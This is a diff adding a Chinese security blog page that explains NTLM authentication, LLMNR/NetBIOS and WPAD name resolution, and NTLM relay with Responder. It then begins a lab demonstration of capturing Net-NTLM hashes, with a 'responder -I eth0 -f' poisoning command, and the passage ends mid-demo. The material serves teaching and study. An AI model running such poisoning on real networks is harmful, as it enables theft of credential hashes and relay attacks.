@@ -1,0 +1,906 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/moon.png">
+  <link rel="icon" href="/img/moon.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="冰蓝弧影">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="中间人攻击 中间人攻击(Man-in-the-Middle Attack，简称“MITM攻击”)是指攻击者与通讯的两端分别创建独立的联系，并交换其所收到的数据，使通讯的两端认为他们正在通过一个私密的连接与对方直接对话，但事实上整个会话都被攻击者完全控制。在中间人攻击中，攻击者可以拦截通讯双方的通话并插入新的内容。中间人攻击一个(缺乏)相互认证的攻击。大多数的加密协议都专门加入了一些特殊的认证方法">
+<meta property="og:type" content="article">
+<meta property="og:title" content="基于NTLM的中间人攻击">
+<meta property="og:url" content="https://blue-arc.github.io/2022/06/02/MITM/index.html">
+<meta property="og:site_name" content="冰蓝弧影">
+<meta property="og:description" content="中间人攻击 中间人攻击(Man-in-the-Middle Attack，简称“MITM攻击”)是指攻击者与通讯的两端分别创建独立的联系，并交换其所收到的数据，使通讯的两端认为他们正在通过一个私密的连接与对方直接对话，但事实上整个会话都被攻击者完全控制。在中间人攻击中，攻击者可以拦截通讯双方的通话并插入新的内容。中间人攻击一个(缺乏)相互认证的攻击。大多数的加密协议都专门加入了一些特殊的认证方法">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://i.loli.net/2021/08/02/G7D8KHj46TNdaiJ.png">
+<meta property="og:image" content="https://i.loli.net/2021/08/02/MFWRKurpgJbavOH.png">
+<meta property="og:image" content="https://i.loli.net/2021/08/03/ChDv1n8sLBeVJdz.png">
+<meta property="og:image" content="https://i.loli.net/2021/08/03/RsauDponXBP2wKY.png">
+<meta property="og:image" content="https://i.loli.net/2021/08/03/NK6JC9kLVOAqlxX.png">
+<meta property="og:image" content="https://i.loli.net/2021/08/03/2p4Sux9QjmvE3qh.png">
+<meta property="og:image" content="https://i.loli.net/2021/08/03/EFfw5xd7hsnWtoU.png">
+<meta property="og:image" content="https://i.loli.net/2021/08/03/U8a9ND6FxmdAkuI.png">
+<meta property="og:image" content="https://i.loli.net/2021/08/03/Gulv2Pp5fYkD1R3.png">
+<meta property="og:image" content="https://i.loli.net/2021/08/03/8WlvOwYzhItKy1V.png">
+<meta property="og:image" content="https://i.loli.net/2021/08/03/Q1kIBTSErnuM3tb.png">
+<meta property="og:image" content="https://i.loli.net/2021/08/03/jzO4EcX3Jr9d5xB.png">
+<meta property="og:image" content="https://i.loli.net/2021/08/03/vlKJNuywSZckYVP.png">
+<meta property="og:image" content="https://i.loli.net/2021/08/03/1HmLPjrKpcZulXO.png">
+<meta property="og:image" content="https://i.loli.net/2021/08/03/ECkNToiMGDLbFKP.png">
+<meta property="og:image" content="https://i.loli.net/2021/08/03/i2Tfg17PoLZIbSX.png">
+<meta property="article:published_time" content="2022-06-01T16:37:03.000Z">
+<meta property="article:modified_time" content="2022-06-02T07:18:43.465Z">
+<meta property="article:author" content="冰蓝弧影">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://i.loli.net/2021/08/02/G7D8KHj46TNdaiJ.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>基于NTLM的中间人攻击 - 冰蓝弧影</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="/css/fluid-extension.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"blue-arc.github.io","root":"/","version":"1.9.0","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+
+  
+<meta name="generator" content="Hexo 6.2.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>BlueArc</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="基于NTLM的中间人攻击"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2022-06-02 00:37" pubdate>
+          2022年6月2日 凌晨
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          8.9k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          75 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">基于NTLM的中间人攻击</h1>
+            
+            <div class="markdown-body">
+              
+              <h1 id="中间人攻击"><a class="markdownIt-Anchor" href="#中间人攻击"></a> 中间人攻击</h1>
+<p>中间人攻击(Man-in-the-Middle Attack，简称“<strong>MITM</strong>攻击”)是指攻击者与通讯的两端分别创建独立的联系，并交换其所收到的数据，使通讯的两端认为他们正在通过一个私密的连接与对方直接对话，但事实上整个会话都被攻击者完全控制。在中间人攻击中，攻击者可以拦截通讯双方的通话并插入新的内容。中间人攻击一个(缺乏)相互认证的攻击。大多数的加密协议都专门加入了一些特殊的认证方法以阻止中间人攻击。例如，SSL协议可以验证参与通讯的一方或双方使用的证书是否是由权威的受信 任的数字证书认证机构颁发，并且能执行双向身份认证。</p>
+<p>中间人攻击过程</p>
+<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-number">1.</span>客户端发送请求到服务端，请求被中间人截获。<br><span class="hljs-number">2.</span>服务器向客户端发送公钥。<br><span class="hljs-number">3.</span>中间人截获公钥，保留在自己手上。然后自己生成一个【伪造的】公钥，发给客户端。<br><span class="hljs-number">4.</span>客户端收到伪造的公钥后，生成加密<span class="hljs-built_in">hash</span>值发给服务器。<br><span class="hljs-number">5.</span>中间人获得加密<span class="hljs-built_in">hash</span>值，用自己的私钥解密获得真秘钥。同时生成假的加密<span class="hljs-built_in">hash</span>值，发给服务器。<br><span class="hljs-number">6.</span>服务器用私钥解密获得假密钥。然后加密数据传输给客户端。<br></code></pre></td></tr></table></figure>
+<img src="https://i.loli.net/2021/08/02/G7D8KHj46TNdaiJ.png" srcset="/img/loading.gif" lazyload alt="image-20210802165409819" style="zoom: 67%;" />
+<blockquote>
+<p><em><strong>中间人攻击的核心理念在于截取hash和传递(假冒认证)</strong></em></p>
+</blockquote>
+<h2 id="0x01-域和工作组"><a class="markdownIt-Anchor" href="#0x01-域和工作组"></a> 0x01 域和工作组</h2>
+<p>工作组和域宏观上都是一群计算机的集合，域中计算机的数量规模通常大于工作组内的计算机。</p>
+<p>工作组内的机器名义上虽然是属于一个集合，但是内部各计算机还是各自管理各自的，没有一个相对成熟的信任机制，工作组内各个计算机的关系依旧是<strong>点对点</strong>。因此，在工作组环境下进行访问认证，仅涉及Client和Server。我们使用的个人计算机，默认便处于<strong>WORKGROUP</strong>工作组环境下</p>
+<p>域是一个有安全边界的计算机集合，同一个域中的计算机通过共同的第三方信任机构建立信任关系，这个第三方信任机构角色由DC(域控制器)担当。通俗来讲，域中的机器都信任域控制器，那么只要域控制器信任我们，我们就可以在域内获得对其他服务器的访问权限。在这种认证体系中涉及三方：<strong>Client、Server、DC</strong></p>
+<p>VMware中域环境的搭建详见：</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_36711901/article/details/102995640">VMware中用虚拟机模拟搭建域（步骤、讲解详实，并以浅显的方式讲解了VMware中的三种网络模式、IP配置），Windows Server 2008 R2为域控服务器，Win7为域成员服务器_胖胖的飞象的博客-CSDN博客_虚拟机怎么创建域</a></p>
+</blockquote>
+<h2 id="0x02-ntlm认证windows"><a class="markdownIt-Anchor" href="#0x02-ntlm认证windows"></a> 0x02 NTLM认证(Windows)</h2>
+<h3 id="本地认证"><a class="markdownIt-Anchor" href="#本地认证"></a> 本地认证</h3>
+<p>Windows不存储用户的明文密码，它会将用户的明文密码经过加密后存储在 SAM (<em>Security Account Manager Database</em>，安全账号管理数据库)文件中。</p>
+<blockquote>
+<p>SAM文件的路径是 <code>%SystemRoot%\system32\config\sam</code></p>
+</blockquote>
+<p>在进行本地认证的过程中，当用户登录时，系统将用户输入的明文密码加密成 <em><code>NTLM Hash</code></em>，与 SAM数据库中的 <em><code>NTLM Hash</code></em> 进行比较，从而实现认证</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">winlogon.exe -&gt; 接收用户输入 -&gt; lsass.exe -&gt; 认证<br></code></pre></td></tr></table></figure>
+<p>首先，用户注销、重启、锁屏后，操作系统会让 <code>winlogon</code>显示登录界面，也就是输入框，接收输入后，将密码交给 <code>lsass</code>进程，<em>这个进程中会存一份明文密码</em>，将明文密码加密成<code>NTLM Hash</code>，对比 SAM数据库中的Hash进行验证</p>
+<h4 id="ntlm-hash的生成"><a class="markdownIt-Anchor" href="#ntlm-hash的生成"></a> NTLM Hash的生成</h4>
+<ul>
+<li>明文密码：<code>123456</code></li>
+<li>首先，密码经过十六进制ASCⅡ转为 -&gt; <code>313233343536</code></li>
+<li>将十六进制结果转为 Unicode格式 -&gt;<code>310032003300340035003600</code></li>
+<li>以 Hex（16进制）数据作MD4加密 -&gt;<code>32ED87BDB5FDC5E9CBA88547376818D4</code></li>
+</ul>
+<blockquote>
+<p>由于NTLM Hash的算法公开，故获得的Hash可暴力破解(MD4单向不可逆)</p>
+</blockquote>
+<h3 id="网络认证"><a class="markdownIt-Anchor" href="#网络认证"></a> 网络认证</h3>
+<p>NTLM凭据包括<strong>域名</strong>，<strong>用户名</strong>和<strong>用户密码的单向Hash</strong>。用户的密码不会在网络链路中传输，加密之后的Challenge值取代原本密码的作用进行对比验证，与传统传输密码的方式相比，具有较高的安全性</p>
+<p>NTLM的认证方式分为交互式和交互式</p>
+<ul>
+<li>通过网络进行的<strong>交互式NTLM身份验证</strong>通常涉及两个系统：<strong>客户端系统</strong>，用户用于请求身份验证；<strong>域控制器</strong>，其中保留与用户密码有关的信息；交互式提供必要凭据，应用场景通常为用户要登录某台客户端</li>
+<li><strong>NTLM非交互式身份验证</strong>通常涉及NTLM三个系统：<strong>客户端</strong>，<strong>服务器</strong>和<strong>代表服务器进行身份验证计算的域控制器</strong>；无需交互式提供凭据，实际应用更多为<strong>已登录某客户端的用户去请求另一台服务器的资源</strong> ，即用户只需要登录一次即可访问所有相互信任的应用系统及共享资源</li>
+</ul>
+<h4 id="工作组环境ntlm认证流程抗重放技术"><a class="markdownIt-Anchor" href="#工作组环境ntlm认证流程抗重放技术"></a> 工作组环境NTLM认证流程（抗重放技术）</h4>
+<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-number">1.</span>用户访问客户机并提供域名，用户名，密码。客户端计算密码的<span class="hljs-built_in">Hash</span>，并丢弃实际密码。<br><span class="hljs-number">2.</span>客户端将用户名发送到服务器。<br><span class="hljs-number">3.</span>服务器生成一个<span class="hljs-number">16</span>字节的随机数Challenge并发送给客户端。<br><span class="hljs-number">4.</span>客户端使用用户密码的<span class="hljs-built_in">Hash</span>对Challenge进行加密，然后将结果response(Net-NTLM <span class="hljs-built_in">hash</span>)返回给服务器。<br><span class="hljs-number">5.</span>服务器使用用户名从SAM数据库中检索用户密码<span class="hljs-built_in">Hash</span>，使用此密码<span class="hljs-built_in">Hash</span>对Challenge进行加密。<br><span class="hljs-number">6.</span>服务器将其加密的Challenge（在步骤<span class="hljs-number">5</span>中）与客户端计算的response（在步骤<span class="hljs-number">4</span>中）进行比较。如果它们相同则身份验证成功。<br></code></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2021/08/02/MFWRKurpgJbavOH.png" srcset="/img/loading.gif" lazyload alt="image-20210802213128690" /></p>
+<h4 id="域环境ntlm认证"><a class="markdownIt-Anchor" href="#域环境ntlm认证"></a> 域环境NTLM认证</h4>
+<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-number">1.</span>用户访问客户机并提供域名，用户名，密码。客户端计算密码的<span class="hljs-built_in">Hash</span>，并丢弃实际密码。<br><span class="hljs-number">2.</span>客户端将用户名发送到服务器。<br><span class="hljs-number">3.</span>服务器生成一个<span class="hljs-number">16</span>字节的随机数Challenge并发送给客户端。<br><span class="hljs-number">4.</span>客户端使用用户密码的<span class="hljs-built_in">Hash</span>对Challenge进行加密，然后将结果response(Net-NTLM <span class="hljs-built_in">hash</span>)返回给服务器。<br><span class="hljs-number">5.</span>服务器将三个信息发送到域控制器：用户名，发送给客户机的Challenge，返回给服务器的response。<br><span class="hljs-number">6.</span>域控制器使用用户名从SAM数据库中检索用户密码<span class="hljs-built_in">Hash</span>。使用此密码<span class="hljs-built_in">Hash</span>对Challenge进行加密。<br><span class="hljs-number">7.</span>域控制器将其加密的Challenge（在步骤<span class="hljs-number">6</span>中）与客户端计算的response（在步骤<span class="hljs-number">4</span>中）进行比较。如果它们相同则身份验证成功。<br></code></pre></td></tr></table></figure>
+<img src="https://i.loli.net/2021/08/03/ChDv1n8sLBeVJdz.png" srcset="/img/loading.gif" lazyload alt="image-20210803080036544" style="zoom:67%;" />
+<blockquote>
+<p><strong>域环境Server会将认证信息使用netlogon协议发送给域控制器，由域控制器完成检验并返回认证结果</strong></p>
+</blockquote>
+<h2 id="0x03-域名解析协议"><a class="markdownIt-Anchor" href="#0x03-域名解析协议"></a> 0x03 域名解析协议</h2>
+<h3 id="llmnr"><a class="markdownIt-Anchor" href="#llmnr"></a> LLMNR</h3>
+<p>从 <strong>Windows Vista</strong> 起，Windows 操作系统开始支持一种新的名称解析协议 —— LLMNR，主要用于局域网中的名称解析。<strong>链路本地多播名称解析</strong>（LLMNR）是一个基于协议的域名系统（DNS）数据包的格式，使得双方的IPv4和IPv6的主机来执行名称解 析为同一本地链路上的主机。当局域网中的DNS服务器不可用时， DNS客户端会使用LLMNR本地链路多播名称解析来解析本地网段上的 主机的名称，直到网络连接恢复正常为止。</p>
+<h4 id="解析过程"><a class="markdownIt-Anchor" href="#解析过程"></a> 解析过程</h4>
+<p>一个完整的正常的 LLMNR 名称解析过程如下图所示：</p>
+<p><strong>注：假定主机 B 已加入了组播组中。</strong></p>
+<p><img src="https://i.loli.net/2021/08/03/RsauDponXBP2wKY.png" srcset="/img/loading.gif" lazyload alt="image-20210803081906640" /></p>
+<hr />
+<h3 id="netbios"><a class="markdownIt-Anchor" href="#netbios"></a> NetBIOS</h3>
+<p><img align = "right" src = "https://i.loli.net/2021/08/03/WEdHQcCwLOzDlNT.png" style="zoom: 80%;" >NetBIOS(Network Basic Input Output System)：网络基本输入输出 系统，它提供了OSI模型中的会话层服务，让在不同计算机上运行的 不同程序，可以在局</p>
+<p>域网中，互相连线，以及分享数据。严格来说， NetBIOS是一种应用程序接口(API)，系统可以利用WINS服务、广播及 Lmhosts文件等多种模式将NetBIOS名解</p>
+<p>析为相应IP地址，几乎所有的 局域网都是在NetBIOS协议的基础上工作的。NetBIOS也是计算机的 标识名称，主要用于局域网内计算机的互访。NetBIOS名称是</p>
+<p>一个长度为16个字符的字符串。MS网络中用到NetBIOS名称的地方有：计算机名，域名，工作组名。</p>
+<p>查看当前机器注册的NetBIOS名称：</p>
+<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">nbtstat -n</span><br></code></pre></td></tr></table></figure>
+<img align = "left" src="https://i.loli.net/2021/08/03/NK6JC9kLVOAqlxX.png" srcset="/img/loading.gif" lazyload alt="image-20210803083305277"  />
+<p>查看当前的NetBIOS名称缓存区：</p>
+<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">nbtstat -c</span> <br></code></pre></td></tr></table></figure>
+<p>查看 NetBIOS节点类型：</p>
+<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">ipconfig /<span class="hljs-keyword">all</span><br></code></pre></td></tr></table></figure>
+<img align = "left" src="https://i.loli.net/2021/08/03/2p4Sux9QjmvE3qh.png" srcset="/img/loading.gif" lazyload alt="image-20210803083606700" />
+<p>采用H节点的WINS客户端，其NetBIOS名称解析的完整顺序为：</p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-bullet">1.</span> 检查要查询的计算机名称是不是自己的计算机名称。<br><span class="hljs-bullet">2.</span> 检查NetBIOS名称缓存区。<br><span class="hljs-bullet">3.</span> 向WINS服务器查询。<br><span class="hljs-bullet">4.</span> 发出广播消息。<br><span class="hljs-bullet">5.</span> 检查Lmhosts文件。<br><span class="hljs-bullet">6.</span> 检查hosts文件或向DNS服务器查询。<br></code></pre></td></tr></table></figure>
+<blockquote>
+<p>Lmhosts文件和hosts文件存放于 <code>%Systemroot%\System32\drivers\etc</code>目录下。</p>
+</blockquote>
+<h3 id="windows系统域名解析顺序"><a class="markdownIt-Anchor" href="#windows系统域名解析顺序"></a> Windows系统域名解析顺序</h3>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-bullet">1.</span> 本地hosts文件（%Systemroot%\System32\drivers\etc\hosts）<br><span class="hljs-bullet">2.</span> DNS缓存/DNS服务器<br><span class="hljs-bullet">3.</span> 链路本地多播名称解析（LLMNR）和NetBIOS名称服务（NBNS）<br></code></pre></td></tr></table></figure>
+<p><strong>也就是说，如果在缓存中没有找到名称，DNS名称服务器又请求失败时，Windows系统就会通过LLMNR和NetBIOS名称服务在本地进行名称解析。这时，客户端就会将未经认证的UDP广播到网络中，询问它是否为本地系统的名称。</strong></p>
+<hr />
+<h2 id="0x04-wpad"><a class="markdownIt-Anchor" href="#0x04-wpad"></a> 0x04 WPAD</h2>
+<p><strong>WPAD（Web Proxy Auto-Discovery Protocol）</strong> 是 Web 代理自动发现协议的简称，该协议的功能是可以使局域网中用户的浏览器可以自动发现内网中的代理服务器，并使用已发现的代理服务器连接互联网或者企业内网。WPAD 支持所有主流的浏览器，从 IE 5.0 开始就已经支持了代理服务器自动发现/切换的功能，不过苹果公司考虑到 WPAD 的安全风险，在包括 OSX 10.10 及之后版本的操作系统中的 Safari 浏览器将不再支持 PAC 文件的解析。</p>
+<h3 id="工作原理"><a class="markdownIt-Anchor" href="#工作原理"></a> 工作原理</h3>
+<p>当系统开启了代理自动发现功能后，用户使用浏览器上网时，浏览器就会在当前局域网中自动查找代理服务器，如果 找到了代理服务器，则会从代理服务器中下载一个名为 <strong>PAC（Proxy Auto-Config）</strong> 的配置文件。该文件中定义了用 户在访问一个 URL 时所应该使用的代理服务器。浏览器会下载并解析该文件，并将相应的代理服务器设置到用户的浏览器中。</p>
+<p>WPAD可以在IE浏览器的 <strong>Internet 选项 — 连接 — 局域网设置 — 自动检测设置</strong> 中看到，系统默认是勾选此功能的。</p>
+<h3 id="wpad劫持"><a class="markdownIt-Anchor" href="#wpad劫持"></a> WPAD劫持</h3>
+<p>WPAD 通常用 DNS 来配置，客户端主机向 DNS 服务器发起了 WPAD＋X 的查询请求。如果客户端主机是处于域环境下时，发起的 WPAD+X 的查询请求为 “WPAD.当前域的域名”。DNS 服务器对 WPAD 主机的名称进行解析返回 WPAD 主机的 IP 地址，客户端主机通过 WPAD 主机的 IP 的 80 端口下载并解析 PAC 文件。</p>
+<blockquote>
+<p>若DNS服务器没有该记录，<strong>则会降为LLMNR+NetBIOS名称查询</strong></p>
+</blockquote>
+<img src="https://i.loli.net/2021/08/03/EFfw5xd7hsnWtoU.png" srcset="/img/loading.gif" lazyload alt="image-20210803154531889" style="zoom:80%;" />
+<h2 id="0x05-ntlm中继"><a class="markdownIt-Anchor" href="#0x05-ntlm中继"></a> 0x05 NTLM中继</h2>
+<p>NTLM 身份验证被封装在其他协议中，但是无论覆盖的协议是什么，消息都是相同的。这允许在其他协议中使用 NTLM 消息。例如，使用 HTTP 进行身份验证的客户端会在“ Authorization”标头中发送 NTLM 身份验证消息。攻击者可以从 HTTP 头中提取这些消息，并在其他协议中使用它们，比如 SMB。</p>
+<blockquote>
+<p>NTLM支持多种协议，例如SMB、HTTP(S)、LDAP、IMAP、SMTP、POP3和MSSQL。</p>
+</blockquote>
+<p>根据上文提到的工作组环境和域环境的网络认证过程，可实现NTLM中继，获取低权限主机的shell</p>
+<p>中继到 SMB 是一种典型的攻击手法。这种攻击会中继到 SMB 允许攻击者在禁用 SMB 签名的主机上执行文件，如果被中继的用户在该主机上具有管理特权。利用Responder中Multi-relay模块，允许攻击者与共享进行交互，例如下载或上传文件，它将生成一个本地 TCP shell 进行连接。</p>
+<h2 id="0x06-responder介绍"><a class="markdownIt-Anchor" href="#0x06-responder介绍"></a> 0x06 Responder介绍</h2>
+<p>Responder是监听LLMNR和NetBIOS协议的工具之一，能够抓取网络中所有的LLMNR和NetBIOS请求并进行响应，获取最初的账户凭证。 Responder会利用内置SMB认证服务器、MSSQL认证服务器、HTTP 认证服务器、HTTPS认证服务器、LDAP认证服务器，DNS服务器、 WPAD代理服务器，以及FTP、POP3、IMAP、SMTP等服务器，收集目标网络中的明文凭据，还可以通过Multi-Relay功能在目标系统中执行命令。</p>
+<p>Github地址:</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://github.com/SpiderLabs/Responder">SpiderLabs/Responder: Responder is a LLMNR, NBT-NS and MDNS poisoner, with built-in HTTP/SMB/MSSQL/FTP/LDAP rogue authentication server supporting NTLMv1/NTLMv2/LMv2, Extended Security NTLMSSP and Basic HTTP authentication. (github.com)</a></p>
+</blockquote>
+<p>kali中内置Responder</p>
+<img align = "left" src = "https://i.loli.net/2021/08/03/tapnIxs28lKghY4.png" style="zoom:80%;" >
+<blockquote>
+<p><strong>Responder原理本质在于受害机监听同域内中所有主机的广播请求，并且伪造应答(poisoning)，达到截取hash值的目的</strong>。</p>
+</blockquote>
+<hr />
+<h1 id="攻击演示"><a class="markdownIt-Anchor" href="#攻击演示"></a> 攻击演示</h1>
+<p><strong>测试环境：</strong></p>
+<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs ada">	kali(被控主机) :  172.16.56.130<br><br>​	windows <span class="hljs-number">7</span> : 172.16.56.11<br><br>​	windows server <span class="hljs-number">2008</span> R2 (DC) : 172.16.56.10<br></code></pre></td></tr></table></figure>
+<h2 id="利用llmnr和netbios截取net-ntlm-hash"><a class="markdownIt-Anchor" href="#利用llmnr和netbios截取net-ntlm-hash"></a> 利用LLMNR和NetBIOS截取Net-NTLM Hash</h2>
+<blockquote>
+<p>两台域内主机默认开启LLMNR和NetBIOS名称服务</p>
+</blockquote>
+<p>对于SMB协议，客户端在连接服务端时，默认先使用本机的用户名和密码hash尝试登录，所以 可以模拟SMB服务器从而截获hash，执行如下命令都可以得到hash。</p>
+<p><strong>1. 开启监听</strong></p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">responder -<span class="hljs-selector-tag">I</span> eth0 -f<br></code></pre></td></tr></table></figure>
+<img align = "left" src="https://i.loli.net/2021/08/03/U8a9ND6FxmdAkuI.png" srcset="/img/loading.gif" lazyload alt="_20210803102000" style="zoom:80%;" />
+<p><strong>2. win7操作</strong></p>
+<blockquote>
+<p>在网络上连接一个无法解析的域名</p>
